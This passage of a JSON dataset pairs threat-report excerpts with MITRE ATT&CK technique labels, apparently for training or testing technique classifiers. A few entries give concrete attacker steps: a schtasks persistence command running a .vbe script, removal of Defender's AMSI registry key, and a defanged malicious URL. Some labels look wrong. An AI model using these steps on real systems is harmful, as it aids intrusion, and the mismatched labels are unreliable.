    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "attacker dump the LSASS process using Task\nManager to a file named lsass.DMP, and later, zip the dump into two\nfiles named lsass.zip and lsass2.zip located in the\nC:\\ProgramData\\psh\\ directory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can make modifications to Registry keys. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can call ShellExecuteW to open the default browser on the URL localhost.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Files and folders of interest are collected as well and staged for exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "will delete the folder containing malicious scripts if it detects the hostname as `PIS-APP` `PIS-MOB` `WSUSPROXY` or `PIS-DB`.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used the ps command to list processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST requests for C2 communications.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "created and modified startup files for persistence.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)  added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can determine whether a system has a 32 bit or 64 bit architecture.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "used a backdoor NESTEGG that has the capability to download and upload files to and from a victims machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The information this malware collected included the following:The computer nameThe usernameThe execution path of the sampleThe BIOS modelA randomly-generated ID to uniquely identify the systemGroup123 utilized this method to ensure their victim was (a) someone they wanted to target further and (b) someone they could infect further based on the information obtained from the reconnaissance phase",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has run a command script to set up persistence as a scheduled task named WinUpdate as well as other encoded commands from the command-line.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "dumped from an injection into the SearchIndexer process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "stored its instructions in a config file in the Registry. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "stages collected data in a text file.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "installs itself under Registry Run key to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to remove all files created during the dropper process.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "is capable of creating reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can delete files from the system.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Use Windows API functions to inject DLL",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "it collects usernames",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "appears to have functionality to modify remote Registry information.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can download additional tools to enable lateral movement.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has installed a new Windows service to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute an arbitary executable.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "downloads a shellcode payload from a remote C2 server and loads it into memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "may use stolen legitimate accounts specified in the configuration data.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "common native Windows tools and commands such as netstat",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "checks for the existence of two configuration files (keyword_parm.txt and parm.txt) and attempts to read the files every 30 seconds.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can download additional modules and payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can determine if a user is logged in by checking to see if explorer.exe is running.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The system’s network interfaces (name, MacAddress, description)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP POST requests to transmit data.(Citation: FireEye Hacking FIN4 Dec 2014)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "searches for specific directories on the victims machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has retrieved internal documents from machines inside victim environments including by using  to stage documents before exfiltration.(Citation: berwachung APT28 Forfiles June 2015)(Citation: DOJ GRU Indictment Jul 2018)(Citation: TrendMicro Pawn Storm 2019)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has harvested valid administrative credentials for lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has installed updates and new malware on victims.(Citation: PWC Cloud Hopper April 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has tricked recipients into enabling malicious macros by getting victims to click enable content in email attachments.(Citation: TrendMicro Msiexec Feb 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The Shell.Application object provides methods for working with the Windows shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "injects into other processes to load modules.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "it creates a one-time scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to transfer files from a remote host. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and saves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can use the Registry for code updates and to collect credentials.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "During  threat actors enumerated sessions and users on a remote host and identified privileged users logged into a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "gathers the OS version logical drives information processor information and volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "it will install a fake Windows service called “windowsupdate”",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Registry run keys to establish persistence for the  Trojan and other tools such as a modified version of TeamViewer remote desktop software.(Citation: ESET RTM Feb 2017)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used built-in API functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used MSI files to download additional files to execute.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020) ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "were initiated from the rundll32.exe process",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to create a Registry entry to establish persistence.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "uses a driver registered as a boot start service as the main load-point.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "process list",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate and exclude selected processes on a compromised host to speed execution of memory scraping.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can identify the username machine name system language keyboard layout OS version and system drive information on a compromised host.(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab and REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Group IB Ransomware May 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The oldest known sample of the Delphi variant (SHA256: 5a02d4e5f6…) provided us a much stronger linkage between this Delphi Cannon and Cannon, as this sample collects system information and sends it to the C2 email address, which includes the path of the running process appended to the string Running place",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can launch a command shell interface for executing commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "delete the driver files.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Persistence via Scheduled Task",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "communicates with its C2 server over HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged the Windows API including using CreateProcess() or ShellExecute() to perform a variety of tasks.(Citation: SecureList Silence Nov 2017)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "contain the host information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has relied on a user opening a malicious document for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "executes payloads using the Windows API call CreateProcessW().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "stores all collected information in a single file before exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can check for specific files and directories associated with virtualization and malware analysis.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used a script (atexec.py) to execute a command on a target machine via Task Scheduler.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group",
    "command": "",
    "labels": [
      "T1105",
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used the Ryeol HTTP Client to facilitate HTTP internet communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "obtains a list of running processes through WMI querying.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "then proceeded to access lsass memory on the host to extract credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can issue shell commands to download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can register itself as a system service to gain persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used the WMI command-line (WMIC) utility to run tasks.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can delete files and itself after infection to avoid analysis.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the malware then proceeds to gather basic system information, including username, computer name, and OS version,",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "the actors using Mimikatz during their operations.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to create persistence for the malware using the Registry autorun key and startup folder. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe likely as a password changing mechanism.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "tools can delete files used during an operation.(Citation: TrendMicro Gamaredon April 2020)(Citation: Symantec Shuckworm January 2022)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can download remote files and additional payloads to the victim's machine.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used a command-line tunneler NACHOCHEESE to give them shell access to a victims machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "gets executed via the “SHELLEXECUTE”.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Both “%APPDATA%\\\\Microsoft\\Windows\\Cookies.txt” and “%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe” are then deleted",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence through a scheduled task using the command C:\\Windows\\system32\\schtasks.exe /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Threat actors performed the first lateral movement from the beachhead to the server using RDP with an Administrator account",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use the Linux API `if_nameindex` to gather network interface names.(Citation: NCSC Cyclops Blink February 2022)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Compromised accounts may be used to maintain access to the network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "s main backdoor connected to a remote C2 server using HTTPS.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used VBScript to run WMI queries. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used the ShellExecuteW() function call. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor could have easily used a second domain administrator account",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "saves information from its keylogging routine as a .zip file in the present working directory.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Overwrite a file with all zeros and mark it for deletion on reboot  Wiping files with zeros and marking it for deletion on reboot.  Delete files using the DeleteFile() API Load an arbitrary library into its process space",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "that makes the HTTP request.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to collect the victims IP address and domain name.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "includes a subproject DonutTest to inject shellcode into a target process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "by redirecting calls to the Windows Sleep API to its own function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to gather the victim's computer name.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "A batch file to stop services",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malware can attempt to disable security features in Microsoft Office and Windows Defender using the taskkill command.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses a .bat file to execute a .dll.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "passes this command line as an argument",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected information and discovered processes in a tmp file.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used  to obtain information from a compromised host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can inject itself into running processes on a compromised host.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "discovers the current domain information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The batch file contained one line,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used Rundll32.exe to execute payloads.(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)(Citation: Microsoft Deep Dive Solorigate January 2021)",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors used RDP to access specific network hosts of interest.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "the malware uses the “del” command",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses the tasklist /v command to obtain a list of processes.(Citation: Kaspersky Turla)",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve a file listing from the system.(Citation: Kaspersky CactusPete Aug 2020) ",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "leveraged valid accounts to maintain access to a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can collect system profile information from a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "is capable of writing to a Registry Run key to establish.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to discover the domain name of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The script will then execute the downloaded file with Rundll32.exe",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from a local system.(Citation: Cobalt Strike TTPs Dec 2017)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used a valid account to maintain persistence via scheduled task.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can delete a specified file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor moved on to downloading a variety of beacon executables",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "contains a collection of CodeExecution modules that inject code (DLL shellcode) into a process.(Citation: GitHub PowerSploit May 2012)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "looping through entries under registry key",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "creates another batch file, system.bat,",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Several tools used by  have been command-line driven.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a file stealer that checks the Document Downloads Desktop and Picture folders for documents and images with specific extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware including by using .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use asynchronous procedure call (APC) injection to execute commands received from C2.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "used for HTTP client requests",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "malware will attempt to gather specific, sensitive information from targeted systems.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` for execution on remote hosts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "executes the reg query command to obtain information in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Because rundll32.exe executed PowerShell, we can see that rundll32.exe created",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "the ransomware to deploy additional tools",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the attacker’s BAT file to run",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor was seen establishing RDP connections",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate directories on a compromise host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download a file to the system from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download payloads from remote C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Visitors are asked to download the “University Of Oxford Job Symposium Pre-Register Tool”:  The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers: OxfordSymposiumRegTool.exe f77ee804de304f7c3ea6b87824684b33 If run by the victim, their computer would get infected, while they are shown this registration process:    Note that after completing the “registration process”, the victim is asked to send the form to an email address in oxford-careers[.]com, which also belongs to the attackers",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has created Registry keys for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Actor signs in to a Microsoft 365 account from an endpoint",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "During  the threat actors deployed malware that used API calls including `CreateProcessAsUser`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has been used to run the whoami command on the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can list files information for specific directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "which can check running processes against a hardcoded list",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to collect information on files and directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "executing malware shellcode and batch files",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "tries to enumerate the current directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has collected the hostname OS version service pack version and the processor architecture from the victims machine.(Citation: Securelist Darkhotel Aug 2015)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can use a file exfiltration tool to collect recently changed files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "executed by the user clicking a shortcut file",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has deleted and overwrote files to cover tracks.(Citation: Unit 42 Magic Hound Feb 2017)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.(Citation: McAfee Lazarus Jul 2020)  has also used various often lesser known functions to perform various types of Discovery and .(Citation: Lazarus APT January 2022)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "uses the command reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used `rundll32.exe` to execute  stagers. ",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "it also invokes the API NTRaiseHardError.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collecting system information such as hostnames",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can identify files with .doc .docx .ppt .pptx .xls .xlsx and .pdf extensions and specific timestamps for collection.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The use of WMIC was leveraged by a batch file",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "creates run key Registry entries pointing to malicious DLLs dropped to disk.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used macros in Excel documents to download and deploy the malware on the users machine.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "recursively searches for all .doc files on the system and collects a directory listing of the Desktop %TEMP% and %WINDOWS%\\Temp directories.(Citation: Kaspersky Turla)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "to steal system information like machine details",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "which allowed the threat actor to move freely between domains.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "then sign on as a legitimate user",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has used valid credentials for privileged accounts with the goal of accessing domain controllers. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "recursively removes the implementation of Windows Defender IOfficeAntiVirus under HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used various types of scripting to perform operations including batch scripts.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "attempts to fetch another stage of the payload to run in memory,",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": " can download additional files for execution on the victims machine. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Once successfully installed in a system, Trickbot will gather system information such as OS, CPU, and memory information, user accounts, lists of installed programs and services.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has a command to upload to its C2 server victim mobile device information including IMEI IMSI SIM card serial number phone number Android version and other information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Adversary ran scheduled tasks for persistence of certain malware samples",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use `rundll32.exe` for execution.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "It created a Run key in the Registry",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify the username of the infected user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Disabling this security control",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
